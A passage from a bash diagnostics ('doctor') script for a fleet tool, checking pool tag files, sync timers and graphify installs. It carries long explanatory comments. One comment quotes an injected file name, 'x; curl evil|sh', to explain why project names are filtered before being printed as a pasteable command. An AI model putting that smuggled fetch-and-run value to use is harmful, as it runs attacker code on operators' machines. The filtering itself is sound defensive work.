    [ -e "$f" ] || [ -L "$f" ] || continue   # unmatched glob: no nullglob here
    n="${f##*/}"
    case "$n" in
      .*) p_leak+=("$n"); continue ;;
    esac
    # UNREADABLE and MALFORMED below mirror `_project_pool_state`'s own
    # PER-TAG arms — its `-f`/`-r` type-and-permission gate, its NUL test, its
    # trailing-whitespace strip and its grammar check, in that order, reaching
    # the same word for the same bytes. A doctor that measured a WELL-FORMED
    # tag differently from the file that obeys it would report on a rule
    # nobody enforces.
    #
    # "PER-TAG" IS THE WHOLE OF THE CLAIM, and it is narrower than the
    # sentence that stood here until this fix round, which said the arms
    # mirrored the reader's "exactly" and was falsified twice over. The
    # DIRECTORY-level arms deliberately differ: an unreadable `$reg` or `$dir`
    # is `pools-unlistable` here and `unreadable` there, and an ABSENT `$reg`
    # is a PASS here and `unreadable` there (see the guard at the top of this
    # function for why). And until this round the NUL arm did not mirror
    # anything at all — see below. That mapping also stops at the three arms
    # named: `untagged` has no bucket here (an untagged project has no file
    # for this loop to see at all), and STALE/ORPHAN/TMP-LEAK below have no
    # counterpart in `_project_pool_state` — they answer "should this tag
    # exist", not "what does this tag mean", and only the doctor asks that
    # question.
    #
    # `-f`/`-r` are checked FIRST and SEPARATELY from the read, exactly as the
    # reader checks them and for its two reasons: `-f` is a TYPE gate that
    # must precede any attempt to OPEN `$f` (a FIFO under `pools/` blocks in
    # `open(2)` forever, and `read < "$f"` blocks there no less than `cat`
    # would), and `-r` settles the permission question BEFORE the read, so a
    # mode-000 tag is answered `pools-unreadable` rather than falling through
    # to a read that finds no delimiter and looks exactly like empty content.
    #
    # THE READ IS `read -r -d ''`, NOT `$(< "$f")` — fix round 6. Bash DROPS a
    # NUL byte wherever it lands in a variable, so once the bytes are inside
    # `$v` the NUL is gone and no later test can find it: `printf 'pool-\0a'`
    # spliced to the legal-looking token `pool-a`, this check PASSED "every
    # project tag … is one legal pool name" while `_project_pool_state`
    # answered `malformed`, and the command substitution ALSO printed
    # `warning: command substitution: ignored null byte in input` straight to
    # the operator's stderr — from the PARENT SHELL, so no redirection on the
    # read could have caught it (all measured). The only builtin that can SEE
    # a NUL is `read -d ''`, whose exit status is 0 iff the read stopped short
    # of EOF and 1 at EOF — a free detector, and the one the reader
    # already uses. Using it removes the command substitution, so both halves
    # of the defect close in one change, and it stays fork-free (this file's
    # PATH is not guaranteed to carry `cat` — measured under
    # `ccrc-doctor.test.ts`'s harness, exit 127; see `_pool_has_line`'s
    # header).
    #
    # THE REDIRECTION ORDER IS THE READER'S, and load-bearing for the same
    # reason it states there: bash applies redirections LEFT TO RIGHT and
    # reports a failing one on whatever stderr is current AT THAT POINT, so
    # `2>/dev/null` must come BEFORE `< "$f"` or a permission error escapes
    # before the silencer is in place. (`-r` above means that only matters for
    # a TOCTOU race, and getting it right costs nothing.)
    #
    # DISCLOSED, NOT CLOSED, exactly as the reader discloses it: `read -d ''`
    # returns 1 for a read FAILURE and for EOF alike, so a failure past
    # `-f && -r` reads as ordinary content. A zero-byte result lands in
    # `p_malformed`; a partial read leaving a legal prefix is reported as a
    # well-formed tag this file never held. Both are the reader's parked arms,
    # inherited here rather than re-argued, because a doctor that measured
    # them differently would be the second reader of one fact this comment
    # exists to prevent.
    if [ ! -f "$f" ] || [ ! -r "$f" ]; then
      p_unread+=("$n"); continue
    fi
    # `-n 64` IS THE READER'S SIZE GATE (D-1850), inherited here for the reason every
    # other arm in this loop is: a doctor that read a tag differently from the
    # file that obeys it would report on a rule nobody enforces. Twice the
    # 32-character grammar, so no legal tag reaches it; an over-cap file stops
    # short of EOF, returns 0 from this same branch, and is answered
    # `pools-malformed` — which is what the reader answers too. Without it a
    # `pools/<p>` symlinked at a growing log is read whole into a variable by
    # the one tool an operator runs when the box is already sick.
    v=
    if { IFS= read -r -d '' -n 64 v; } 2>/dev/null < "$f"; then
      p_malformed+=("$n"); continue
    fi
    v="${v%"${v##*[![:space:]]}"}"
    if ! [[ "$v" =~ $POOL_NAME_RE ]]; then
      p_malformed+=("$n"); continue
    fi
    # STALE is about the PROJECT, not the pool: a directory under the projects
    # root, or a registry row naming it — the same two-way test the verb's
    # `--pool` arm applies, so a custom-workdir project is never called stale.
    if [ ! -d "$proot/$n" ] && ! _pool_has_line "$n" "$reg_rows"; then
      p_stale+=("$n")
    fi
    # ORPHAN is about the POOL: no TAGGED account carries the name, so no
    # account is in it BY TAG. WARN, not FAIL — the pool may be about to gain
    # an account (O5).
    #
    # WHETHER A SESSION OF SUCH A PROJECT STRANDS IS NOT DECIDED HERE. This
    # comment said "will strand rather than cross (ruling 6)" and then, for one
    # round, said it strands "only when neither exists" — both wrong, the second
    # because existence is not availability (D-1959, D-1972). The rule has ONE
    # home: spec §5.7.3. Do not restate it here.
    if [ -n "$known" ] && ! _pool_has_line "$v" "$known"; then
      p_orphan+=("$n ($v)")
    fi
  done

  local rc=0
  if [ "${#p_unread[@]}" -gt 0 ]; then
    _dr_fail pools "pools-unreadable: $(_dr_join ${p_unread[@]+"${p_unread[@]}"}) — the tag exists and cannot be read, so ccd refuses to place work for these projects rather than treating them as unconstrained" \
      "fix the mode/ownership under $dir — check with: ls -l $dir"
    rc=1
  fi
  if [ "${#p_malformed[@]}" -gt 0 ]; then
    _dr_fail pools "pools-malformed: $(_dr_join ${p_malformed[@]+"${p_malformed[@]}"}) — the file holds something that is not one pool name, so nothing can decide these projects' placement" \
      "rewrite each as a single lowercase token: ccd project-pool --project <p> --pool <name>"
    rc=1
  fi
  if [ "${#p_stale[@]}" -gt 0 ]; then
    # One `ccd project-pool --project <n> --clear` per stale name, not a single
    # templated sentence — the remedy is the exact command an operator runs,
    # and a `<p>` placeholder left unsubstituted is not a command at all.
    # AND THE NAME IS FILESYSTEM-DERIVED (D-1852), so it is filtered before it lands
    # inside a command an operator is invited to paste. Not an escalation —
    # writing under `$dir` already requires code execution as this user — but
    # this check's whole value is that what it prints can be trusted, and a
    # tag file named `x; curl evil|sh` rendered `remedy: clear each: ccd
    # project-pool --project x; curl evil|sh --clear`. The charset is
    # `_ws_project_valid`'s own (`ccd:3685`, `^[A-Za-z0-9._-]+$`, no
    # dot-leading), so no name `ccd` would ever CREATE is omitted — a
    # cross-file claim, and `pool-name-parity.test.ts` measures it rather than
    # trusting this sentence. A leading `-` is refused too: it is shell-safe
    # but would be read by `ccd` as a flag, not as the project.
    # The MESSAGE above is a different surface and is not filtered: it is
    # printed, never executed, and `_dr_line` already squashes the newline
    # that is the only way to forge a second verdict line.
    local -a p_stale_cmds=(); local p_stale_omit=0
    for n in "${p_stale[@]}"; do
      case "$n" in
        ''|.*|-*|*[!A-Za-z0-9._-]*) p_stale_omit=$((p_stale_omit + 1)); continue ;;
      esac
      p_stale_cmds+=("ccd project-pool --project $n --clear")
    done
    local p_stale_remedy=""
    if [ "${#p_stale_cmds[@]}" -gt 0 ]; then
      p_stale_remedy="clear each: $(_dr_join "${p_stale_cmds[@]}")"
    fi
    if [ "$p_stale_omit" -gt 0 ]; then
      [ -z "$p_stale_remedy" ] || p_stale_remedy+=" — and "
      p_stale_remedy+="$p_stale_omit name(s) are NOT printed as a command: they are not shaped like a project name (a character outside A-Za-z0-9._- , or a leading dot or dash), so the command would not mean what it looks like. Remove those by hand under $dir"
    fi
    _dr_warn pools "pools-stale: $(_dr_join ${p_stale[@]+"${p_stale[@]}"}) — tagged, but no project directory and no registry row of that name exists, so nothing reads these tags" \
      "$p_stale_remedy"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ "${#p_orphan[@]}" -gt 0 ]; then
    _dr_warn pools "pools-orphan-pool: $(_dr_join ${p_orphan[@]+"${p_orphan[@]}"}) — no account in this box's roster is TAGGED into that pool. A hard-blocked session of these projects strands rather than crossing unless some untagged account is AVAILABLE to take it — installed, not kill-switched, and under the swap ceiling" \
      "either tag an account into the pool in \$HOME/.ccrc/accounts.json and redeploy the agent lane, or retag the project: ccd project-pool --project <p> --pool <name>"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ "${#p_leak[@]}" -gt 0 ]; then
    _dr_warn pools "pools-tmp-leak: $(_dr_join ${p_leak[@]+"${p_leak[@]}"}) — a dot-leading entry, i.e. a tmp file a SIGKILL left between the write and the rename; inert, and no reader sees it" \
      "rm the named entries under $dir"
    [ "$rc" -eq 1 ] || rc=2
  fi
  if [ "$rc" -ne 0 ]; then return "$rc"; fi
  # THE PASS SENTENCE SAYS ONLY WHAT RAN (D-1853). `known` empty means the roster
  # projection could not be read, the orphan arm above made NO claim, and the
  # old single sentence asserted the third clause ("names a pool this box's
  # roster carries") anyway — a PASS reporting a check that was skipped, which
  # is the same false-PASS shape D-1848's own doctor instance was numbered for.
  # AND THE FIRST FIX POINTED SOMEWHERE FALSE, caught by the same round's
  # verification: it said `_check_wrappers` reports the unreadable projection
  # on its own line. Measured — `_check_wrappers` (:2189-2680) contains ZERO
  # occurrences of `accounts.sh`; it reads `accounts.json`, and on a box with
  # the JSON and no projection it answers PASS. `_check_graphify` sources the
  # projection when it can and silently SKIPS when it cannot, emitting no
  # verdict. So nothing in this file reports that file, and this sentence now
  # says so rather than sending an operator to read a line that is not there.
  # (On a FLEET box the real finding is louder anyway: `ccd` dies at source
  # time without it, at its own `no account roster at` guard. This also runs
  # on the server box, where absence is ordinary, so the verdict stays a PASS
  # and states its own limit.)
  if [ "$vocab" = measured ] && [ -n "$known" ]; then
    _dr_pass pools "every project tag under $dir is one legal pool name, names a project that exists, and names a pool this box's roster carries"
  elif [ "$vocab" = measured ]; then
    _dr_pass pools "every project tag under $dir is one legal pool name and names a project that exists — and this box's roster carries NO pools at all: the vocabulary was read and is empty, so the orphan arm had nothing to match against and made no claim"
  else
    _dr_pass pools "every project tag under $dir is one legal pool name and names a project that exists — the pool-vocabulary half is UNMEASURED: \$HOME/.ccrc/accounts.sh could not be read, and no other check here reports that file (_check_wrappers reads accounts.json, not the projection)"
  fi
}

# ── pool-sync: the EFFECT the timer's own ACTIVE state cannot prove ───────
# Item 4 (I2, wave-1 fix round A). `_check_services` (`known` array, above)
# measures `ccd-pool-sync.timer`'s ACTIVATION state, which stays `active`
# while its oneshot fails every run — no `~/.cc-secrets/ccrc-mail.token`, a
# rotated token, a non-200 from the control plane, all print PASS there.
# Combined with items 1 and 5 (same round) there used to be no working
# surface anywhere that reported a stale projection at all.
#
# This is the EFFECT check the activation state cannot be: the ARTIFACT the
# oneshot WRITES, `$REG/pool-epoch`, and its own lease — never the timer's
# reported state. Same design `_check_graphify`'s own census sub-check
# already uses for its sibling timer (this file's own header, `:808-827`,
# names that precedent and why: "the EFFECT design reaches a job through its
# OUTPUT").
#
# INSTALLED, not merely present, gates whether ABSENCE is even a finding —
# the identical test `_check_services` uses to build its own `installed`
# array (`CCRC_UNIT_DIR`/`_dr_unit_file`), so this check and that one can
# never disagree about which boxes have the unit at all. A box with no
# `ccd-pool-sync.timer` file has no control plane BY CONFIGURATION (item 5's
# own fix, same round: `--role both`/`--role server`, the single-box
# default) — that box places from the DECLARED roster tag instead, which is
# correct there, not a gap doctor should raise.
_check_pool-sync() {
  local f="$HOME/.cc-sessions/pool-epoch"
  local unit_path="$CCRC_UNIT_DIR/$(_dr_unit_file ccd-pool-sync.timer)"
  if [ ! -f "$unit_path" ]; then
    _dr_skip pool-sync "ccd-pool-sync.timer is not installed on this box — no control plane by configuration (--role both/--role server, the single-box default); this box places from the declared \$HOME/.ccrc/accounts.json tag instead, which is correct here"
    return 3
  fi

  # ABSENCE, on an INSTALLED box, is the false-PASS `_check_services` cannot
  # see: this node's own `ccd-pool-sync` oneshot has never once succeeded,
  # so `_acct_pool_state` (`ccd/ccd`) answers `unreadable` for every account
  # and EVERY tagged project on this box refuses placement, silently, until
  # now.
  if [ ! -e "$f" ] && [ ! -L "$f" ]; then
    # Final fix round, item 16. FAILing this UNCONDITIONALLY made a correct
    # `ccrc install --role fleet` end at exit 1 on every box, always: the
    # timer converges on its own (`OnUnitActiveSec=60s`,
    # deploy/systemd/ccd-pool-sync.timer) and a box that just landed the unit
    # has not had one tick yet. Measured: server/test/ccrc-install.test.ts,
    # 3 failures, all in the fleet-role describe, all from this arm. The
    # FAIL text itself is false on the box that trips it — "placement into
    # every tagged project... refuses" — a fresh box tags nothing yet.
    #
    # DISCRIMINATOR (preference 1 of the brief): the installed timer FILE's
    # own mtime, evidence the sync has had its chance rather than an
    # invented sentinel. Verified sound before relying on it: `_inst_units`
    # (ccd/ccrc) lands this unit through `_inst_atomic`, whose copy is a
    # plain `cp` — never `cp -p` — followed by `mv -f` onto the final name.
    # A bare `cp` does NOT preserve the source's mtime; the destination gets
    # the wall-clock instant the copy ran. So this file's mtime is genuinely
    # install (or re-install) time, never a timestamp carried in from the
    # shipped tree — unlike `_inst_keep_aside`'s `cp -p`, which is a
    # different call for a different, personal-file purpose. `_inst_atomic`
    # also short-circuits to a bare `chmod` when the bytes already match
    # (`cmp -s`), so an idempotent re-run of an unchanged unit does NOT reset
    # this mtime either — it only moves on a real (re)install. That `cmp -s`
    # short-circuit is `ccd/ccrc`'s own, though: deploy.sh's agent-arm (`AGENT_BUILD_CMD='_unit_atomic() {`)
    # `_unit_atomic` — CLAUDE.md's AGENT-FIRST rule makes it the COMMON path
    # for this unit, not `ccd/ccrc`'s — carries no `cmp -s` at all and
    # re-copies `ccd-pool-sync.timer` unconditionally (its `_unit_atomic ~/ccrc/deploy/systemd/ccd-pool-sync.timer` line)
    # on every `deploy.sh agent <host>`, so on that path this mtime resets on
    # every deploy, not only a real (re)install.
    #
    # GRACE = two of the timer's own periods, not an invented constant: one
    # tick for `OnBootSec=45s`/`AccuracySec=10s` slack plus one more so a
    # doctor run landing mid-cycle is not itself the reason this goes red
    # (both from deploy/systemd/ccd-pool-sync.timer).
    #
    # COST, stated as the brief requires: an unrelated `ccrc install` that
    # ships new BYTES for this one unit (not a fresh install) also resets
    # this mtime, so a box that has genuinely never synced in days goes back
    # to WARN for up to 120s after any such reinstall, before this arm can
    # FAIL again on the next doctor run. Narrow and self-healing — never a
    # permanent mask — and strictly better than the permanent false-FAIL
    # this replaces on every fresh install.
    #
    # A `_plat_mtime` that cannot answer (stat missing, file raced away)
    # falls straight through to the FAIL below — the safe direction: no
    # evidence of a chance means no benefit of the doubt.
    local pool_sync_grace=$((2 * 60)) unit_mtime unit_age
    unit_mtime="$(_plat_mtime "$unit_path" 2>/dev/null)"
    if [[ "$unit_mtime" =~ ^[0-9]+$ ]]; then
      unit_age=$(($(date +%s) - unit_mtime))
      if [ "$unit_age" -ge 0 ] && [ "$unit_age" -lt "$pool_sync_grace" ]; then
        _dr_warn pool-sync "pool-sync-not-yet-synced: ccd-pool-sync.timer was installed ${unit_age}s ago and $f has not been written yet — the timer fires every 60s (OnUnitActiveSec) and converges on its own; expected right after an install, not a fault" \
          "wait for the timer to fire (up to ~60s) and re-run ccrc doctor — still absent past that window is the real fault: read the oneshot's own log ($(_dr_log_hint ccd-pool-sync.service))"
        return 2
      fi
    fi
    _dr_fail pool-sync "pool-sync-never-synced: ccd-pool-sync.timer is installed (this is a fleet box) but $f has never been written — placement into every tagged project on this box refuses" \
      "read the oneshot's own log ($(_dr_log_hint ccd-pool-sync.service)) — a missing or rotated \$HOME/.cc-secrets/ccrc-mail.token and a non-200 from the control plane are the two measured causes; \`systemctl --user start ccd-pool-sync.service\` forces an immediate retry once fixed"
    return 1
  fi
  if [ ! -f "$f" ] || [ ! -r "$f" ]; then
    _dr_fail pool-sync "pool-sync-unreadable: $f exists but cannot be read, so this box's placement authority (_acct_pool_state) answers unreadable for every account" \
      "check permissions: ls -l $f"
    return 1
  fi

  # LIGHTER-WEIGHT THAN THE PLACEMENT AUTHORITY'S OWN GRAMMAR, DELIBERATELY —
  # the same stance `parseObservedEpochDoc`'s own docstring takes for this
  # IDENTICAL file (`shared/agent-protocol.ts`, item 1, same round): doctor's
  # job is diagnostic disclosure, not placement-safety enforcement, so this
  # reads only the `lease <n>` line's own freshness rather than
  # re-implementing `_acct_pool_state`'s full terminator/duplicate-line/
  # NUL/64-KiB grammar a second time in a second file for a third purpose.
  # PURE BASH, NO `grep` — this file resolves no external binary it does not
  # already need for the subject it is measuring (`_check_disk`'s own rule,
  # stated once there and followed here): a line-oriented read plus parameter
  # expansion is the same move `_acct_pool_state`'s own per-line loop makes.
  local lease='' line
  while IFS= read -r line || [[ -n "$line" ]]; do
    case "$line" in
      lease\ *) lease="${line#lease }" ;;
    esac
  done < "$f"
  if [[ ! "$lease" =~ ^(0|[1-9][0-9]*)$ ]]; then
    _dr_warn pool-sync "pool-sync-malformed: $f does not parse as this box's own reader would — no single, well-formed \`lease <n>\` line" \
      "the next timer fire (every 60s) rewrites it atomically; inspect the current content by hand: cat $f"
    return 2
  fi
  local now; now="$(date +%s)"
  if [ "$now" -gt "$lease" ]; then
    _dr_fail pool-sync "pool-sync-stale: $f is past its lease — the control-plane link has been down longer than the lease, so this box's placement authority answers stale (undecided) for every account, not merely last-known" \
      "check the control-plane link: is the server reachable, and is \$HOME/.ccrc/agent.env's URL/token current — $(_dr_log_hint ccd-pool-sync.service) shows the oneshot's own last attempt"
    return 1
  fi

  _dr_pass pool-sync "this box's account-pool projection ($f) is present and within its lease — the control plane is reaching it"
}

# ── update-sync: the EFFECT the puller's own ACTIVE state cannot prove ────
# Fix round 1 item 6 / review 155 C3, same class as `_check_pool-sync` right
# above (and the same gap `_inst_units`'s OWN COMMENT, at its `ccd-pool-sync`
# placement arm, names for this exact sibling): `_check_services`' `known`
# array measures `ccd-update-sync.timer`'s ACTIVATION state, which stays
# `active` while its oneshot fails every run — a missing or rotated
# `~/.cc-secrets/ccrc-mail.token` and a non-200 from the control plane both
# print PASS there. Nothing else here reported `~/.ccrc/update-intent` at
# all, so a fleet node whose puller has never once succeeded stayed green
# while every `ccrc update` without --to refuses `unreadable (never
# synced)`.
#
# Unlike pool-sync, this does NOT re-read the file and re-derive its own
# verdict: `_upd_intent_state` (ccd/ccrc) is the ONE reader of this exact
# grammar, already role-aware and already carrying the puller's own
# re-checked value bounds (C23, fix round 1 item 15). A second parser here
# would be the drift this file's own header warns against, for a document a
# node's own `ccrc update`/`ccrc channel` already parse authoritatively.
# This check calls it and reports its words, never its own — including its
# REMEDY (batch E review fix round 1, M3): `_upd_intent_say` already picks
# the remedy by `UPD_INTENT_ROLE` (the puller's own oneshot on a fleet node,
# or restarting `ccrc.service` on server/both, whose own process is the
# writer there) — this check calls it rather than hard-coding the puller's
# remedy, which would be the WRONG one on the one box where this arm is
# actually reachable: a server/both box carrying a LEFTOVER timer file (a
# role changed after install — `CCRC_ROLE` is seed-once, `_inst_env`).
#
# INSTALLED, not merely present, gates whether ABSENCE is even a finding —
# same test `_check_pool-sync` uses (`CCRC_UNIT_DIR`/`_dr_unit_file`). A box
# with no `ccd-update-sync.timer` file has no puller BY CONFIGURATION: only
# a `--role fleet` install ever places this pair (`_inst_units`'s own
# `ccd-update-sync` placement, gated identically to `ccd-pool-sync`'s right
# beside it) — a server/both box's own process writes `~/.ccrc/update-intent`
# itself, and macOS ships neither unit (timers are systemd-only).
# `_upd_intent_state`'s own macOS arm is consequently unreachable from here.
# Its `not-configured` arm (role fleet/"", timer file ABSENT) is ALSO
# unreachable past this check's own SKIP, which already requires that exact
# file to exist — but handled explicitly anyway (M3), rather than falling
# into the FAIL arm's "every update without --to refuses" claim, which is
# false for `not-configured` (a box in that state follows stable).
_check_update-sync() {
  # M4: the loaded-guard every sibling check that calls a function declared
  # in `ccrc` carries (`_check_pool-sync` needs none of its own — it calls
  # nothing outside this file — so `_check_update-exposure`'s own guard is
  # the shape to match).
  if ! declare -F _upd_intent_state >/dev/null 2>&1; then
    _dr_fail update-sync "ccrc's own update-intent reader is not loaded, so this box's projection freshness was never measured" \
      "this is a bug in ccrc, not a fact about your box — _check_update-sync calls _upd_intent_state, declared once in ccrc itself, and this check table was sourced by something that is not ccrc"
    return 1
  fi
  local unit_path="$CCRC_UNIT_DIR/$(_dr_unit_file ccd-update-sync.timer)"
  if [ ! -f "$unit_path" ]; then
    _dr_skip update-sync "ccd-update-sync.timer is not installed on this box — no puller here (only a --role fleet install places it; a server/both box's own process writes ~/.ccrc/update-intent itself, and macOS ships no systemd timer)"
    return 3
  fi

  _upd_intent_state
  case "$UPD_INTENT_STATE" in
    ok|none)
      _dr_pass update-sync "this box's update-intent projection is present and within its lease — the control plane is reaching it"
      return 0 ;;
    not-configured)
      _dr_skip update-sync "~/.ccrc/update-intent reads not-configured (${UPD_INTENT_WHY:-no reason given}) though ccd-update-sync.timer is installed here — unreachable on a consistently configured box; this box follows stable, which is not a fault to FAIL on"
      return 3 ;;
  esac

  # GRACE, mirroring pool-sync's own (same constant, same reasoning: one
  # tick for OnBootSec=45s/AccuracySec=10s slack plus one more so a doctor
  # run landing mid-cycle is not itself the reason this goes red) — but ONLY
  # for the "never synced" shape (`_upd_intent_state`'s own WHY for a fresh
  # box: the timer file exists, the document does not). A file that exists
  # and fails to parse, or has gone stale, had its chance; the grace is for
  # a box that has not had one tick yet, never for a fixture the puller
  # itself already wrote and got wrong.
  if [ "$UPD_INTENT_WHY" = "never synced" ]; then
    local update_sync_grace=$((2 * 60)) unit_mtime unit_age
    unit_mtime="$(_plat_mtime "$unit_path" 2>/dev/null)"
    if [[ "$unit_mtime" =~ ^[0-9]+$ ]]; then
      unit_age=$(($(date +%s) - unit_mtime))
      if [ "$unit_age" -ge 0 ] && [ "$unit_age" -lt "$update_sync_grace" ]; then
        _dr_warn update-sync "update-sync-not-yet-synced: ccd-update-sync.timer was installed ${unit_age}s ago and ~/.ccrc/update-intent has not been written yet — the timer fires every 60s (OnUnitActiveSec) and converges on its own; expected right after an install, not a fault" \
          "wait for the timer to fire (up to ~60s) and re-run ccrc doctor — still absent past that window is the real fault: read the oneshot's own log ($(_dr_log_hint ccd-update-sync.service))"
        return 2
      fi
    fi
  fi

  _dr_fail update-sync "update-sync-${UPD_INTENT_STATE}: ~/.ccrc/update-intent is ${UPD_INTENT_STATE} (${UPD_INTENT_WHY}) — every 'ccrc update' without --to on this box refuses" \
    "$(_upd_intent_say)"
  return 1
}

# ── graphify: the AST-graph sweep's engine, skills, excludes, census, and
# worktrees headroom (D-995, D-997) ────────────────────────────────────────
# `~/.ccrc/graph-sweep.json` is a census FOR an operator, not a doctor of its
# own — `ccd-graph-sweep` runs unattended off a 15-minute timer
# (deploy/systemd/ccd-graph-sweep.timer) and never prints to anyone's
# terminal, so this check is the only place any of the following seven facts
# ever reach a human:
#
#   1. role         — a server box runs no wrapper homes and grows no graphs.
#   2. engine       — the venv's `graphify --version` against the pin stamp.
#   3. PATH         — MOVED OUT to its own check, `graphify-path`: what a
#                     session runs when it types `graphify` is a FAIL, not a
#                     warning, and its remedy is a different verb from this
#                     check's (this file's own "grouped by remedy" rule).
#   4. skills       — every rostered home's `.graphify_version` against the pin.
#   5. excludes     — every tree the sweep would walk ignores its own output.
#   6. census       — what the sweep itself last reported about itself.
#   7. disk (D-995) — headroom on the filesystem the sweep actually writes to.
#
# ── FINDINGS ARE GROUPED BY REMEDY, NOT BY CONDITION NUMBER ───────────────
# This file's own header states the rule ("ONE CHECK MAY ANSWER IN TWO (OR
# MORE) CLASSES"): two conditions an operator fixes with the SAME verb share
# one bucket and one verdict line; a condition whose fix is a DIFFERENT verb
# gets its own bucket and its own line. (2) and (4) are both cured by
# `ccrc install` (it provisions the venv, stamps the pin, and converges every
# rostered home's skill in one pass), so they share `gfx_install_fail`. (5)'s
# WARN is cured the same way (the exclude writer lives in the same verb) but
# stays a SEPARATE array from (2)/(4) because it is a different CLASS
# (WARN, not FAIL) — `_dr_warn`/`_dr_fail` are not interchangeable printers.
# (1), (3), (6) and (7) each have a remedy nothing else here shares, so each
# keeps its own bucket.
_check_graphify() {
  # ── (1) role: SKIP shape, same as `_check_fleet`'s and `_check_config`'s
  # own absent-subject arms — a server box has no rostered wrapper homes for
  # graphify to run against, so PASS would claim an agreement nobody
  # measured and WARN would report a problem there is none. Existence and
  # readability are checked BEFORE `_box_env_value` runs (its `< "$file"`
  # redirection is fatal to a missing file) — the same guard
  # `cmd_update`'s own CCRC_ROLE read uses (ccrc:9243-9246).
  local role=""
  if [ -f "$BOX_ENV_FILE" ] && [ -r "$BOX_ENV_FILE" ] && declare -F _box_env_value >/dev/null 2>&1; then
    role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  fi
  if [ "$role" = server ]; then
    _dr_skip graphify "this box's role is server — graphify builds and serves per-wrapper-home graphs on the fleet host, and a server box has none"
    return 3
  fi

  local engine="$HOME/.ccrc/graphify-venv/bin/graphify"
  local pin_file="$HOME/.ccrc/graphify.pin" census="$HOME/.ccrc/graph-sweep.json"
  local pin=""
  # `read`, not `cat` — this file resolves no external binary it does not
  # already need for the subject it is measuring (`_check_disk`'s own
  # header), and `read` still populates `pin` even when the file has no
  # trailing newline (it only returns non-zero for that, which `|| true`
  # absorbs — measured against a bare, no-newline stamp).
  if [ -r "$pin_file" ]; then IFS= read -r pin < "$pin_file" || true; fi
  pin="$(_dr_trim "$pin")"

  # ── the search gate's state (R5, D-1613) ────────────────────────────────
  # NOT a bucket and NOT a finding: the gate is armed by default and its
  # kill-switch is an operator switch deliberately set, which this fleet
  # reports rather than warns about (`$REG/coordinator-paused` reaches the
  # wire, not a doctor line). But nothing else on the box reports it at all —
  # the file has no writer in the tree and no verb prints it — so it rides
  # every verdict line this check prints, PASS and WARN and FAIL alike: which
  # class the rest of the measurement lands in must not decide whether the
  # operator can see whether sessions are being gated.
  # The path is `ccd/session-hook.sh`'s `GRAPH_GATE_OFF`, whose hook is the
  # only reader; `ccrc-doctor-graphify.test.ts` HARVESTS it from there and
  # plants its fixture at whatever the hook now says, so the two spellings
  # cannot drift apart in silence.
  local gfx_gate=", gate on"
  [ ! -e "$HOME/.ccrc/graph-gate-off" ] \
    || gfx_gate=", gate off (operator file \$HOME/.ccrc/graph-gate-off)"

  local -a gfx_install_fail=() gfx_excludes_warn=()
  local -a gfx_census_fail=() gfx_census_warn=() gfx_disk_fail=() gfx_disk_warn=() gfx_disk_unread_warn=()
  local -a gfx_rows_warn=()

  # ── (2) engine: the venv's own `graphify --version` against the pin ──────
  # Parsed by parameter expansion, not awk — the same rule `_check_disk`'s own
  # header states (this file resolves no external binary it does not already
  # need for the SUBJECT it is measuring).
  if [ ! -x "$engine" ]; then
    gfx_install_fail+=("no graphify engine at \$HOME/.ccrc/graphify-venv/bin/graphify")
  else
    local raw got
    raw="$("$engine" --version 2>/dev/null)"
    got="$(_dr_trim "${raw##* }")"
    if [ -z "$pin" ]; then
      gfx_install_fail+=("the engine reports $got but there is no pin at \$HOME/.ccrc/graphify.pin to compare it against")
    elif [ "$got" != "$pin" ]; then
      gfx_install_fail+=("the engine reports $got but the pin at \$HOME/.ccrc/graphify.pin says $pin")
    fi
  fi

  # ── (4) skills: every rostered home's stamp against the pin ──────────────
  # `install-graphify-skill.sh`'s own homes+realpath-de-dup idiom, mirrored
  # (not sourced — that script is a converge-on-run installer, not a
  # library): source accounts.sh for CCRC_ACCOUNTS/_ccrc_cfg_dir, then de-dup
  # on the REAL skills/ directory, because two rostered homes may symlink
  # skills/ into one place (the reference fleet's .claude-gpt/.claude-kimi)
  # and a de-duped check reports that shared directory once, not twice. A
  # roster home that does not exist on this box yet is skipped, not FAILed —
  # `install-graphify-skill.sh` itself treats a missing home the same way,
  # and `_check_wrappers` already owns "the roster and disk disagree".
  if [ -r "$HOME/.ccrc/accounts.sh" ]; then
    # shellcheck source=/dev/null
    source "$HOME/.ccrc/accounts.sh" 2>/dev/null
  fi
  if declare -F _ccrc_cfg_dir >/dev/null 2>&1 && [ "${#CCRC_ACCOUNTS[@]}" -gt 0 ]; then
    local -A gfx_seen=()
    local acct dir skills_real stamp
    for acct in "${CCRC_ACCOUNTS[@]}"; do
      dir="$(_ccrc_cfg_dir "$acct" 2>/dev/null)" || continue
      [ -n "$dir" ] || continue
      [ -d "$dir" ] || continue   # nothing has materialised this home yet — fine
      skills_real="$(realpath "$dir/skills" 2>/dev/null)" || continue
      [ -n "${gfx_seen[$skills_real]:-}" ] && continue
      gfx_seen[$skills_real]=1
      stamp=""
      # `read`, not `cat` — same reason the pin read above gives; the skill
      # stamp `install-graphify-skill.sh` writes is ALSO bare, no trailing
      # newline (`printf '%s' "$PIN" > "$STAGE/.graphify_version"`).
      if [ -r "$skills_real/graphify/.graphify_version" ]; then
        IFS= read -r stamp < "$skills_real/graphify/.graphify_version" || true
      fi
      if [ -z "$stamp" ]; then
        gfx_install_fail+=("$dir has no graphify skill stamp (skills/graphify/.graphify_version)")
      elif [ "$stamp" != "$pin" ]; then
        gfx_install_fail+=("$dir's graphify skill stamp is $stamp, not the pin $pin")
      fi
    done
  fi

  # ── (5) excludes: every tree the sweep would walk must ignore its own
  # graphify-out/ — `ccd-graph-sweep`'s own gate, TRAILING SLASH included
  # (R-3: `git check-ignore -q graphify-out` without it FAILS for a
  # never-built tree even with the exclude line present). Mirrored, not
  # sourced: the sweep is a standalone oneshot, not a library either.
  local proot="$HOME/projects" wroot="$HOME/worktrees"
  local -a gfx_trees=()
  local d
  for d in "$proot"/*/ "$wroot"/*/*/; do
    [ -d "$d" ] || continue
    git -C "$d" rev-parse --is-inside-work-tree >/dev/null 2>&1 && gfx_trees+=("${d%/}")
  done
  local gfx_excl_bad=0
  for d in ${gfx_trees[@]+"${gfx_trees[@]}"}; do
    git -C "$d" check-ignore -q graphify-out/ 2>/dev/null || gfx_excl_bad=$((gfx_excl_bad + 1))
  done
  if [ "$gfx_excl_bad" -gt 0 ]; then
